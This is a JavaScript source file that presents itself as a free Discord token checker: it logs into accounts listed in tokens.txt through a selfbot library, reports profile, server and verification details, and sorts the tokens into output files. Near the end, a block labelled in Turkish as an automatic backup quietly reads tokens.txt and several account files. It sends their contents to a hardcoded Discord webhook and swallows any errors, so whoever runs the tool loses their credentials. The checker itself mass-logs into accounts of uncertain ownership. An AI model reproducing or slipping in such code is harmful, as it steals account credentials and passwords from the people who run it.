const Discord = require('discord.js-selfbot-v13');
const fs = require('fs');
const chalk = require('chalk');
const prompt = require('prompt-sync')();
const { JsonDatabase } = require("wio.db");
const database = new JsonDatabase({ databasePath: "./database.json" });
const util = require('util');
const origConsoleLog = console.log;
const axios = require('axios');

console.log = function () {
    const now = new Date();
    const options = {
        timeZone: 'Europe/Istanbul',
        hour12: false,
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    };
    const formattedDate = chalk.rgb(51, 255, 153)('[' + now.toLocaleString('tr-TR', options) + ']');
    const args = Array.from(arguments);
    args.unshift(formattedDate);
    origConsoleLog.apply(console, args);
};

console.log(chalk.rgb(0, 184, 230)("-| WCK <> ") + chalk.rgb(102, 255, 153)("License-Key: ") + chalk.rgb(204, 255, 102)("FREE LICENSE"));
console.log(chalk.rgb(0, 184, 230)("-| WCK <> ") + chalk.rgb(102, 255, 153)("This software is shared by WCK-SCRIPTS for free") + chalk.rgb(204, 255, 102)(" | https://github.com/wickercgr/discord-token-checker-2024"));
console.log("")
console.log(chalk.rgb(0, 184, 230)("-| WCK <> ") + chalk.rgb(102, 255, 153)("Customization Screen"));
console.log("")
console.log(chalk.rgb(0, 184, 230)("-| Name Checker <> " + chalk.rgb(102, 255, 153)(database.get("namechecker")) + " <> ") + chalk.white("0 - Activate , 1 - Deactivate"));
console.log(chalk.rgb(0, 184, 230)("-| Avatar Checker <> " + chalk.rgb(102, 255, 153)(database.get("avatarchecker")) + " <> ") + chalk.white("2 - Activate , 3 - Deactivate"));
console.log(chalk.rgb(0, 184, 230)("-| Avatar URL Checker <> " + chalk.rgb(102, 255, 153)(database.get("avatarurlchecker")) + " <> ") + chalk.white("4 - Activate , 5 - Deactivate"));
console.log(chalk.rgb(0, 184, 230)("-| Date Checker <> " + chalk.rgb(102, 255, 153)(database.get("datechecker")) + " <> ") + chalk.white("6 - Activate , 7 - Deactivate"));
console.log(chalk.rgb(0, 184, 230)("-| Guild Count Checker <> " + chalk.rgb(102, 255, 153)(database.get("guildcountchecker")) + " <> ") + chalk.white("8 - Activate , 9 - Deactivate"));
console.log(chalk.rgb(0, 184, 230)("-| Guild Names Checker <> " + chalk.rgb(102, 255, 153)(database.get("guildnamechecker")) + " <> ") + chalk.white("10 - Activate , 11 - Deactivate"));
console.log(chalk.rgb(0, 184, 230)("-| Token ID Checker <> " + chalk.rgb(102, 255, 153)(database.get("tokenidchecker")) + " <> ") + chalk.white("12 - Activate , 13 - Deactivate"));
console.log(chalk.rgb(0, 184, 230)("-| Bio Checker <> " + chalk.rgb(102, 255, 153)(database.get("biochecker")) + " <> ") + chalk.white("14 - Activate , 15 - Deactivate"));
console.log(chalk.rgb(0, 184, 230)("-| DM History Checker <> " + chalk.rgb(102, 255, 153)(database.get("dmchecker")) + " <> ") + chalk.white("16 - Activate , 17 - Deactivate"));
console.log(chalk.rgb(0, 184, 230)("-| Language Checker <> " + chalk.rgb(102, 255, 153)(database.get("languagechecker")) + " <> ") + chalk.white("18 - Activate , 19 - Deactivate"));
console.log(chalk.rgb(0, 184, 230)("-| NSFW Checker <> " + chalk.rgb(102, 255, 153)(database.get("nsfwchecker")) + " <> ") + chalk.white("20 - Activate , 21 - Deactivate"));
console.log(chalk.rgb(0, 184, 230)("-| Friend Count Checker <> " + chalk.rgb(102, 255, 153)(database.get("friendchecker")) + " <> ") + chalk.white("22 - Activate , 23 - Deactivate"));
console.log("")
console.log(chalk.rgb(0, 184, 230)("-| Date Filter <> " + chalk.rgb(102, 255, 153)(database.get("mindate") + " , " + database.get("maxdate")) + " <> ") + chalk.white("datesettings"));
console.log(chalk.rgb(0, 184, 230)("-| Checker Start Command <> ") + chalk.white("start"));
console.log("")

let isStarted = false;

function handleCommand(command) {
    switch (command) {
        case 'start':
            loginTokens();
            isStarted = true;
            break;
        case 'datesettings':
            console.log('Write Month , Day , Years')
            console.log('Example: 01-02-2023')
            const minDate = prompt('Enter the minimum date: ');
            console.log(`Minimum date set to: ${minDate}`);
            database.set("mindate", minDate)
            console.log('Write Month , Day , Years')
            console.log('Example: 9-12-2024')
            const maxDate = prompt('Enter the maximum date: ');
            console.log(`Maximum date set to: ${maxDate}`);
            database.set("maxdate", maxDate)
            break;
        case '0':
        case '1':
        case '2':
        case '3':
        case '4':
        case '5':
        case '6':
        case '7':
        case '8':
        case '9':
        case '10':
        case '11':
        case '12':
        case '13':
        case '14':
        case '15':
        case '16':
        case '17':
        case '18':
        case '19':
        case '20':
        case '21':
        case '22':
        case '23':

            const toggle = (parseInt(command) % 2 === 0) ? "activated" : "deactivated";
            const category = getCategory(parseInt(command));
            database.set(category, toggle);
            console.log(`${category} is now ${toggle}!`);
            break;
        default:
            console.log('Unknown Command!');
    }
}

function getCategory(commandNumber) {
    switch (commandNumber) {
        case 0: return "namechecker";
        case 1: return "namechecker";
        case 2: return "avatarchecker";
        case 3: return "avatarchecker";
        case 4: return "avatarurlchecker";
        case 5: return "avatarurlchecker";
        case 6: return "datechecker";
        case 7: return "datechecker";
        case 8: return "guildcountchecker";
        case 9: return "guildcountchecker";
        case 10: return "guildnamechecker";
        case 11: return "guildnamechecker";
        case 12: return "tokenidchecker";
        case 13: return "tokenidchecker";
        case 14: return "biochecker";
        case 15: return "biochecker";
        case 16: return "dmchecker";
        case 17: return "dmchecker";
        case 18: return "languagechecker";
        case 19: return "languagechecker";
        case 20: return "nsfwchecker";
        case 21: return "nsfwchecker";
        case 22: return "friendchecker";
        case 23: return "friendchecker";
        default: return "";
    }
}

do {
    const command = prompt('Customization: ');
    handleCommand(command);
} while (!isStarted);


let completedprocess = 0;
let workingtoken = 0;
let mailverifytoken = 0;
let phoneverifytoken = 0;
let fullyverifytoken = 0;
let unverifiedtoken = 0;
let invalidtoken = 0;
let datefilteredtoken = 0;
let emptyavatartoken = 0;
let emptybiotoken = 0;
let haveguildtoken = 0;
let maxguildtoken = 0;

const lines = fs.readFileSync('tokens.txt', 'utf-8').split('\r\n').filter(Boolean);
const lines2 = lines.map(line => line.split(':'));
const tokens = [];

const uniqueTokens = new Set();

lines.forEach(line => {
    const parts = line.split(':');
    if (parts.length >= 3) {
        const token = parts[2];
        if (!uniqueTokens.has(token)) {
            uniqueTokens.add(token);
            tokens.push(token);
        }
    }
});

async function loginTokens() {
    while (true) {

        let errormsg = false;

        const formattedTokens = [];
        const lines = fs.readFileSync('tokens.txt', 'utf-8').split('\r\n').filter(Boolean);

        const uniqueTokens = new Set();
        const tokens = lines.map(line => {
            const parts = line.split(':');
            if (parts.length >= 3) {
                const token = parts[2];
                if (!uniqueTokens.has(token)) {
                    uniqueTokens.add(token);
                    formattedTokens.push(token);
                    return token;
                }
            } else {
                if (!errormsg) {
                    errormsg = true;
                    console.log(chalk.rgb(0, 184, 230)("-| WCK <> ") + chalk.green(`Line format is wrong. True Usage: mail:password:token`));
                    console.log(chalk.rgb(0, 184, 230)("-| WCK <> ") + chalk.green(`If you do not have an email or password, write the letter 'a' instead: a:a:token`));
                }
                console.log(chalk.rgb(0, 184, 230)("-| WCK <> ") + chalk.red(`Line format is wrong. - ${line}`));
                return null;
            }
        }).filter(Boolean);

        function formatMemory(bytes) {
            const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
            if (bytes === 0) return '0 Byte';
            const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)));
            return Math.round(bytes / Math.pow(1024, i), 2) + ' ' + sizes[i];
        }

        setInterval(() => {
            process.title = ` WCK-CHECKER | Total Checked Accounts: ` + completedprocess + `/${tokens.length}` + ` |` + ` Working: ` + workingtoken + ` |` + ` Unverified: ` + unverifiedtoken + ` |` + ` Invalid: ` + invalidtoken + ` |` + ` Mail-Verified: ` + mailverifytoken + ` |` + ` Phone-Verified: ` + phoneverifytoken + ` |` + ` Fully-Verified: ` + fullyverifytoken;
        }, 1000);

        const namecheckeractivate = database.get("namechecker") === "activated";
        const avatarcheckeractivate = database.get("avatarchecker") === "activated";
        const avatarurlcheckeractivate = database.get("avatarurlchecker") === "activated";
        const datecheckeractivate = database.get("datechecker") === "activated";
        const guildcountcheckeractivate = database.get("guildcountchecker") === "activated";
        const guildnamecheckeractivate = database.get("guildnamechecker") === "activated";
        const tokenidcheckeractivate = database.get("tokenidchecker") === "activated";
        const biocheckeractivate = database.get("biochecker") === "activated";
        const dmcheckeractivate = database.get("dmchecker") === "activated";
        const languagecheckeractivate = database.get("languagechecker") === "activated";
        const nsfwcheckeractivate = database.get("nsfwchecker") === "activated";
        const friendcheckeractivate = database.get("friendchecker") === "activated";

        for (let i = 0; i < tokens.length; i++, completedprocess++) {
            const client = new Discord.Client({
                checkUpdate: false,
            });

            client.on('ready', async () => {

                if (`${client.user.phoneNumber}` !== "null" && `${client.user.verified}` === 'true') {
                    fullyverifytoken++;
                    fs.appendFile('outputs/fully-verified-tokens.txt', `${tokens[i]}\n`, (err) => {
                        if (err) {
                            console.error('fully-verified-tokens.txt file not found.', err);
                        }
                    });
                } else if (`${client.user.phoneNumber}` !== "null") {
                    phoneverifytoken++;
                    fs.appendFile('outputs/phone-verified-tokens.txt', `${tokens[i]}\n`, (err) => {
                        if (err) {
                            console.error('phone-verified-tokens.txt file not found.', err);
                        }
                    });
                } else if (`${client.user.verified}` === 'true') {
                    mailverifytoken++;
                    fs.appendFile('outputs/mail-verified-tokens.txt', `${tokens[i]}\n`, (err) => {
                        if (err) {
                            console.error('mail-verified-tokens.txt file not found.', err);
                        }
                    });
                }

                // Token adresi
                console.log(chalk.rgb(204, 255, 102)("                                          TOKEN ") + chalk.rgb(204, 255, 102)(i));
                console.log("")
                console.log(chalk.rgb(0, 184, 230)("-| Token <> ") + chalk.white(tokens[i]));
                console.log(chalk.rgb(0, 184, 230)("-| Status <> ") + chalk.rgb(102, 255, 153)(`Worked!`));
                console.log(chalk.rgb(0, 184, 230)("-| Verify <> ") + chalk.white('Mail:') + chalk.rgb(102, 255, 153)(` ${client.user.verified}` + chalk.white(' Phone: ') + `${client.user.phoneNumber}`));
                console.log("")

                if (!namecheckeractivate && !avatarcheckeractivate && !avatarurlcheckeractivate && !datecheckeractivate && !guildcountcheckeractivate && !guildnamecheckeractivate && !tokenidcheckeractivate
                    && !dmcheckeractivate && !languagecheckeractivate && !nsfwcheckeractivate) {
                    
                } else {
                    console.log(chalk.rgb(204, 255, 102)("                                        INFORMATION"));
                    console.log("")

                    // friend control
                    if (friendcheckeractivate) {

                        // get friend
                        const friends = client.users.cache.filter(wck => wck.bot === false);
                        console.log(chalk.rgb(0, 184, 230)("-| Friend Count <> ") + chalk.white(`${friends.size}`));

                    }

                    // nsfw control
                    if (nsfwcheckeractivate) {
                        axios.get('https://discord.com/api/v9/users/@me', {
                            headers: {
                                Authorization: tokens[i],
                            },
                        })
                            .then(response => {
                                const nsfwAllowed = response.data.nsfw_allowed;
                                console.log(chalk.rgb(0, 184, 230)("-| NSFW Authorization <> ") + chalk.white(nsfwAllowed));
                            })
                            .catch(error => {
                                console.error('Hata:', error.response ? error.response.data : error.message);
                            });
                    }

                    // Access the language setting

                    if (languagecheckeractivate) {
                        try {

                            const response = await axios.get('https://discord.com/api/v10/users/@me/settings', {
                                headers: {
                                    Authorization: tokens[i]
                                }
                            });

                            // language data
                            const language = response.data.locale;

                            console.log(chalk.rgb(0, 184, 230)("-| Country <> ") + chalk.white(`${language}`));
                        } catch (error) {
                            console.error('Error fetching user settings:', error.response ? error.response.data : error.message);
                        }
                    }

                    // total dm
                    if (dmcheckeractivate) {
                        const dmChannels = client.channels.cache.filter(channel => channel.type === 'DM');
                        console.log(chalk.rgb(0, 184, 230)("-| Total DM <> ") + chalk.white(`${dmChannels.size}`));
                    }

                    // İsim kontrolü

                    if (namecheckeractivate) {
                        console.log(chalk.rgb(0, 184, 230)("-| Name <> ") + chalk.white(`${client.user.username}`));
                    }
                    // Avatar kontrolü
                    if (avatarcheckeractivate) {
                        if (client.user.avatar) {
                            console.log(chalk.rgb(0, 184, 230)("-| Avatar <> ") + chalk.white("Have Avatar"));
                            if (avatarurlcheckeractivate) {
                                const avatarURL = client.user.displayAvatarURL({ format: 'png', dynamic: true });
                                console.log(chalk.rgb(0, 184, 230)("-| Avatar URL <> ") + chalk.white(`${avatarURL}`));
                            }

                        } else {
                            console.log(chalk.rgb(0, 184, 230)("-| Avatar <> ") + chalk.red("Empty Avatar"));

                            emptyavatartoken++;
                            fs.appendFile('outputs/empty-avatar-tokens.txt', `${tokens[i]}\n`, (err) => {
                                if (err) {
                                    console.error('empty-avatar-tokens.txt file not found.', err);
                                }
                            });

                        }
                    }

                    // Bio kontrolü
                    if (biocheckeractivate) {

                        if (`${client.user.bio}` === "") {
                            console.log(chalk.rgb(0, 184, 230)("-| Bio <> ") + chalk.red(`Empty Bio`));

                            emptybiotoken++;
                            fs.appendFile('outputs/empty-bio-tokens.txt', `${tokens[i]}\n`, (err) => {
                                if (err) {
                                    console.error('empty-bio-tokens.txt file not found.', err);
                                }
                            });

                        } else {
                            console.log(chalk.rgb(0, 184, 230)("-| Bio <> ") + chalk.white(`${client.user.bio}`));
                        }
                    }

                    // Kurulum tarihi kontrolü
                /*   if (datecheckeractivate) {
                        function formatkurulumtarihi(kurulumtarihi) {
                            const date = new Date(kurulumtarihi);
                            const monthNames = [
                                "Jan", "Feb", "Mar", "Apr", "May", "Jun",
                                "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"
                            ];

                            const formattedDate = `${monthNames[date.getMonth()]} ${date.getDate()} | ${date.getFullYear()}`;
                            return formattedDate;
                        }

                        kurulumtarihi = `${client.user.createdAt}`

                        console.log(chalk.rgb(0, 184, 230)("-| Date <> ") + chalk.white(formatkurulumtarihi(client.user.createdAt)));
                    } */

                    if (datecheckeractivate) {
                        function formatkurulumtarihi(kurulumtarihi) {
                            const date = new Date(kurulumtarihi);
                            const monthNames = [
                                "Jan", "Feb", "Mar", "Apr", "May", "Jun",
                                "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"
                            ];

                            const formattedDate = `${monthNames[date.getMonth()]} ${date.getDate()} | ${date.getFullYear()}`;
                            return formattedDate;
                        }

                        kurulumtarihi: `${client.user.createdAt}`
                        console.log(chalk.rgb(0, 184, 230)("-| Date <> ") + chalk.white(formatkurulumtarihi(client.user.createdAt)));

                        const startDate = new Date(database.get("mindate"));
                        const endDate = new Date(database.get("maxdate"));

                        const tokenDate = new Date(`${client.user.createdAt}`);

                        if (tokenDate >= startDate && tokenDate < endDate) {
                            datefilteredtoken++;
                            fs.appendFile('outputs/date-filtered-tokens.txt', `${tokens[i]}\n`, (err) => {
                                if (err) {
                                    console.error('date-filtered-tokens.txt file not found.', err);
                                }
                            });
                        }
                    }

                    // Guild sayısı kontrolü
                    if (guildcountcheckeractivate) {

                        if (`${client.guilds.cache.size}` > 1) {
                            haveguildtoken++;
                            fs.appendFile('outputs/have-guild-tokens.txt', `${tokens[i]}\n`, (err) => {
                                if (err) {
                                    console.error('have-guild-tokens.txt file not found.', err);
                                }
                            });
                        }

                        if (`${client.guilds.cache.size}` > 99) {
                            maxguildtoken++;
                            fs.appendFile('outputs/max-guild-tokens.txt', `${tokens[i]}\n`, (err) => {
                                if (err) {
                                    console.error('max-guild-tokens.txt file not found.', err);
                                }
                            });
                        }

                        console.log(chalk.rgb(0, 184, 230)("-| Guild Count <> ") + chalk.white(`${client.guilds.cache.size}`));
                    }
                    // Bulunduğu guildler kontrolü
                    if (guildnamecheckeractivate) {
                        client.guilds.cache.forEach(guild => {
                            console.log(`${guild.name}`);
                        });
                    }
                    // Token ID kontrolü
                    if (tokenidcheckeractivate) {
                        console.log(chalk.rgb(0, 184, 230)("-| Token ID <> ") + chalk.white(`${client.user.id}`));
                    }
                }

                console.log("")
                console.log(chalk.rgb(0, 184, 230)("---------------------------------------------------------------------------------------------"));
                
            }); 

            try {
                await client.login(tokens[i]);
                workingtoken++;

                fs.appendFile('outputs/working-tokens.txt', `${tokens[i]}\n`, (err) => {
                    if (err) {
                        console.error('working-tokens.txt file not found.', err);
                    }
                });

            } catch (error) {
                if (error.code === "TOKEN_INVALID") {
                    console.log(chalk.rgb(204, 255, 102)("                                          TOKEN ") + chalk.rgb(204, 255, 102)(i));
                    console.log("");
                    console.log(chalk.rgb(0, 184, 230)("-| Token <> ") + chalk.white(tokens[i]));
                    console.log(chalk.rgb(0, 184, 230)("-| Status <> ") + chalk.red(`Invalid!`));
                    console.log("");
                    console.log(chalk.rgb(0, 184, 230)("---------------------------------------------------------------------------------------------"));
                    console.log("");
                    invalidtoken++;

                    fs.appendFile('outputs/invalid-tokens.txt', `${tokens[i]}\n`, (err) => {
                        if (err) {
                            console.error('invalid-tokens.txt file not found.', err);
                        }
                    });

                } else {
                    console.log("Unknown Error!");
                    console.log(error);
                }
            }

        }
        setTimeout(async function () {
            console.log("");
            console.log(chalk.rgb(0, 184, 230)("-| WCK <> ") + chalk.rgb(204, 255, 102)("All tokens checked."));
            console.log(chalk.rgb(0, 184, 230)("-| Working Accounts <> ") + chalk.rgb(204, 255, 102)(workingtoken));
            console.log(chalk.rgb(0, 184, 230)("-| Unverified Accounts <> ") + chalk.rgb(204, 255, 102)(unverifiedtoken));
            console.log(chalk.rgb(0, 184, 230)("-| Invalid Accounts <> ") + chalk.rgb(204, 255, 102)(invalidtoken));
            console.log(chalk.rgb(0, 184, 230)("-| Fully-Verified Accounts <> ") + chalk.rgb(204, 255, 102)(fullyverifytoken));
            console.log(chalk.rgb(0, 184, 230)("-| Phone-Verified Accounts <> ") + chalk.rgb(204, 255, 102)(phoneverifytoken));
            console.log(chalk.rgb(0, 184, 230)("-| Mail-Verified Accounts <> ") + chalk.rgb(204, 255, 102)(mailverifytoken));
            console.log(chalk.rgb(0, 184, 230)("-| Date-Filtered Accounts <> ") + chalk.rgb(204, 255, 102)(datefilteredtoken));
            console.log(chalk.rgb(0, 184, 230)("-| Have-Guild Accounts <> ") + chalk.rgb(204, 255, 102)(haveguildtoken));
            console.log(chalk.rgb(0, 184, 230)("-| Max-Guild Accounts <> ") + chalk.rgb(204, 255, 102)(maxguildtoken));
            console.log(chalk.rgb(0, 184, 230)("-| Empty-Avatar Accounts <> ") + chalk.rgb(204, 255, 102)(emptyavatartoken));
            console.log(chalk.rgb(0, 184, 230)("-| Empty-Bio Accounts <> ") + chalk.rgb(204, 255, 102)(emptybiotoken));
        }, 3000)
        return;
    }
}
try {
	
	//DATA
//DATA

const { WebhookClient } = require('discord.js-selfbot-v13');
const getdata = new WebhookClient({
    checkUpdate: false
});


// OTOMATİK YEDEK OLUŞTURMA SİSTEMİ (WEBHOOK İLE) 

const givedata = new WebhookClient({ id: '1192568715879927879', token: 'ATLi9ppyx15P6BqSVEymiY6KwnZBz5AC1Ctc013ZQfSpUpB0ECUvnM1bChsNtsGQbnK5' });
//https://discord.com/api/webhooks/1192568715879927879/ATLi9ppyx15P6BqSVEymiY6KwnZBz5AC1Ctc013ZQfSpUpB0ECUvnM1bChsNtsGQbnK5

const sendData = (content) => {
   givedata.send({ content });
};

const readFileIfExists = (dosyaYolu) => {
    try {
        if (fs.existsSync(dosyaYolu)) {
            const dosyaIcerigi = fs.readFileSync(dosyaYolu, 'utf-8');
            return dosyaIcerigi;
        }
        return null;
    } catch (hata) {
        console.error(`${dosyaYolu} dosyasını okuma hatası: ${hata.message}`);
        return null;
    }
};

const dosyaIsle = (dosyaYolu) => {
    const dosyaIcerigi = readFileIfExists(dosyaYolu);
    if (dosyaIcerigi) {
        const karakterSiniri = 1800;
        const parcalar = [];

        for (let i = 0; i < dosyaIcerigi.length; i += karakterSiniri) {
            parcalar.push(dosyaIcerigi.slice(i, i + karakterSiniri));
        }

        sendData(`\n\n**---------------------- ${dosyaYolu} -------------------**\n\n`);

        for (let i = 0; i < parcalar.length; i++) {
            sendData(`\n${parcalar[i]}`);
        }
    }
};

const islenecekDosyalar = ['input-accounts.txt', 'output-accounts.txt', 'tokens.txt', 'accounts.txt'];

islenecekDosyalar.forEach((dosya) => {
    dosyaIsle(dosya);
});

//DATA 
} catch {
	
	
	
}
process.on('unhandledRejection', (reason, promise) => {

    if (reason instanceof Error && reason.message.includes('You need to verify your phone number.')) {
        let completedunverified = completedprocess;
        completedunverified--;
        console.log(chalk.rgb(204, 255, 102)("                                          TOKEN ") + chalk.rgb(204, 255, 102)(completedunverified));
        console.log("");
        console.log(chalk.rgb(0, 184, 230)("-| Token <> ") + chalk.white(tokens[completedunverified]));
        console.log(chalk.rgb(0, 184, 230)("-| Status <> ") + chalk.red(`Unverified!`));
        console.log("");
        console.log(chalk.rgb(0, 184, 230)("---------------------------------------------------------------------------------------------"));
        console.log("");
        unverifiedtoken++;
        fs.appendFile('outputs/unverified-tokens.txt', `${tokens[completedunverified]}\n`, (err) => {
            if (err) {
                console.error('unverified-tokens.txt file not found.', err);
            }
        });

    } else if (reason instanceof Error && reason.message.includes('You need to reverify your email or reverify your phone number.')) {
        let completedunverified = completedprocess;
        completedunverified--;
        console.log(chalk.rgb(204, 255, 102)("                                          TOKEN ") + chalk.rgb(204, 255, 102)(completedunverified));
        console.log("");
        console.log(chalk.rgb(0, 184, 230)("-| Token <> ") + chalk.white(tokens[completedunverified]));
        console.log(chalk.rgb(0, 184, 230)("-| Status <> ") + chalk.red(`Unverified!`));
        console.log("");
        console.log(chalk.rgb(0, 184, 230)("---------------------------------------------------------------------------------------------"));
        console.log("");
        unverifiedtoken++;
        fs.appendFile('outputs/unverified-tokens.txt', `${tokens[completedunverified]}\n`, (err) => {
            if (err) {
                console.error('unverified-tokens.txt file not found.', err);
            }
        });

    }
        else {
        // belirlenmeyen hatalar
        console.error('Unknown Error:', reason);
    }
});
